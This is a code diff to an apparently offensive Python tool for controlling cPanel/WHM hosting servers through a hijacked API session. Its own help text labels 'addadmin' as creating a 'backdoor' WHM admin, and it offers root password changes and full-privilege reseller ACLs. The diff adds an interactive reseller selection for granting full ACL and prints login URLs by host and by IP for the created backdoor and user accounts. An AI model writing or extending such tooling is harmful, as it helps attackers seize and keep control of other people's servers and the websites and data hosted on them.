@@ -458,6 +458,9 @@ def action_list_accounts(ctx):
             safe_print(f"\n  {C.CYAN}{'USER':<20} {'DOMAIN':<35} {'STATUS':<12} EMAIL{C.RESET}")
             safe_print(f"  {'-' * 80}")
             
+            # Sort accounts by domain ascending
+            accts = sorted(accts, key=lambda x: x.get('domain', '').lower())
+            
             for a in accts:
                 user = a.get('user', '?')
                 domain = a.get('domain', '?')
@@ -504,11 +507,11 @@ def action_list_accounts(ctx):
     else:
         safe_print(str(data)[:1000])
 
-def action_set_acl(ctx, username):
-    """Set full ACL for a reseller user"""
+def _apply_acl(ctx, username):
+    """Apply full ACL to a specific reseller"""
     scheme, host, port, canonical, session_base, token, timeout = ctx
     
-    log("API", f"Setting full ACL for reseller: {username}")
+    log("STEP", f"Setting full ACL for {username}...")
     
     # Use individual ACL flags (acllist-all=all doesn't work on many versions)
     acl_params = {
@@ -549,6 +552,7 @@ def action_set_acl(ctx, username):
                 safe_print(f"  {C.GREEN}✓ Unlimited limits enabled{C.RESET}")
             else:
                 log("WARN", f"Could not set unlimited limits: {data2}")
+            return True
         else:
             log("ERR", f"Failed to set ACL: {data.get('metadata', {}).get('reason', 'Unknown error')}")
             safe_print(f"  {C.RED}✗ {data.get('metadata', {}).get('reason', 'Unknown error')}{C.RESET}")
@@ -557,6 +561,47 @@ def action_set_acl(ctx, username):
         safe_print(f"  {C.RED}✗ API error{C.RESET}")
     
     safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict) else str(data)[:800])
+    return False
+
+def action_set_acl(ctx):
+    """Interactive ACL setup - list resellers and let user select"""
+    scheme, host, port, canonical, session_base, token, timeout = ctx
+    
+    log("API", "Listing all resellers...")
+    s, data = whm_api(*ctx[:6], "listresellers", {}, timeout)
+    
+    if s == 200 and isinstance(data, dict):
+        resellers = data.get("data", {}).get("reseller", [])
+        
+        if not resellers or len(resellers) == 0:
+            log("WARN", "No resellers found on this server")
+            safe_print(f"  {C.YELLOW}⚠ No resellers found{C.RESET}")
+            return
+        
+        safe_print(f"\n  {C.CYAN}{'NO':<4} {'RESELLER':<20} DOMAIN{C.RESET}")
+        safe_print(f"  {'-' * 50}")
+        
+        reseller_map = {}
+        for i, reseller in enumerate(resellers, 1):
+            reseller_map[i] = reseller
+            safe_print(f"  {C.GREEN}{i:<4} {C.RESET}{reseller:<20} ")
+        
+        safe_print(f"\n  {C.CYAN}Pilih reseller untuk set ACL (1-{len(resellers)}): {C.RESET}", end="")
+        
+        try:
+            choice = input().strip()
+            choice_num = int(choice)
+            
+            if choice_num in reseller_map:
+                selected = reseller_map[choice_num]
+                _apply_acl(ctx, selected)
+            else:
+                safe_print(f"  {C.RED}✗ Pilihan tidak valid{C.RESET}")
+        except (ValueError, EOFError):
+            safe_print(f"  {C.RED}✗ Input tidak valid{C.RESET}")
+    else:
+        log("ERR", f"Failed to list resellers: HTTP {s}")
+        safe_print(str(data)[:1000])
 
 def action_change_passwd(ctx, new_password):
     """Change root password"""
@@ -740,8 +785,10 @@ def action_create_user(ctx, username: str, domain: str, passwd: str, make_resell
     safe_print(f"  Password : {passwd}")
     safe_print(f"  Domain   : {domain}")
     safe_print(f"  Reseller : {'YES' if make_reseller else 'NO'}")
-    safe_print(f"\n  {C.CYAN}Login URL: {scheme}://{canonical}:2083{C.RESET}")
-    safe_print(f"  {C.CYAN}WHM Login: {scheme}://{canonical}:2087{C.RESET}")
+    safe_print(f"\n  {C.CYAN}Login URL (Host): {scheme}://{canonical}:2083{C.RESET}")
+    safe_print(f"  {C.CYAN}Login URL (IP):   {scheme}://{host}:2083{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login (Host): {scheme}://{canonical}:2087{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login (IP):   {scheme}://{host}:2087{C.RESET}")
 
 def action_add_admin(ctx, username: str, passwd: str):
     """Create backdoor WHM admin/reseller"""
@@ -845,8 +892,10 @@ def action_add_admin(ctx, username: str, passwd: str):
     safe_print(f"  Password : {passwd}")
     safe_print(f"  Profile  : super_admin / reseller")
     safe_print(f"  Domain   : {temp_domain}")
-    safe_print(f"\n  {C.CYAN}Login URL: {scheme}://{canonical}:{port}{C.RESET}")
-    safe_print(f"  {C.CYAN}WHM Login: {scheme}://{canonical}:{port}/cpsess{token.replace('/cpsess', '')}/{C.RESET}")
+    safe_print(f"\n  {C.CYAN}Login URL (Host): {scheme}://{canonical}:2083{C.RESET}")
+    safe_print(f"  {C.CYAN}Login URL (IP):   {scheme}://{host}:2083{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login (Host): {scheme}://{canonical}:2087{C.RESET}")
+    safe_print(f"  {C.CYAN}WHM Login (IP):   {scheme}://{host}:2087{C.RESET}")
 
 def action_version(ctx):
     """Get cPanel version"""
@@ -1175,7 +1224,7 @@ def whm_shell(ctx):
     accounts                          List all cPanel accounts
     adduser <u> <d> <p> [--reseller]  Create cPanel account (option with reseller)
     deluser <username>                Remove cPanel account
-    acl <username>                    Set full ACL for reseller (fix WHM menu)
+    acl                               Set full ACL for reseller (interactive)
     addadmin <u> <p>                  Create backdoor admin
 
   {C.CYAN}Package Management:{C.RESET}
@@ -1217,10 +1266,7 @@ def whm_shell(ctx):
                 action_list_accounts(ctx)
 
             elif cmd == "acl":
-                if not arg:
-                    print("  Usage: acl <username>")
-                    continue
-                action_set_acl(ctx, arg)
+                action_set_acl(ctx)
 
             elif cmd == "cat":
                 if not arg:
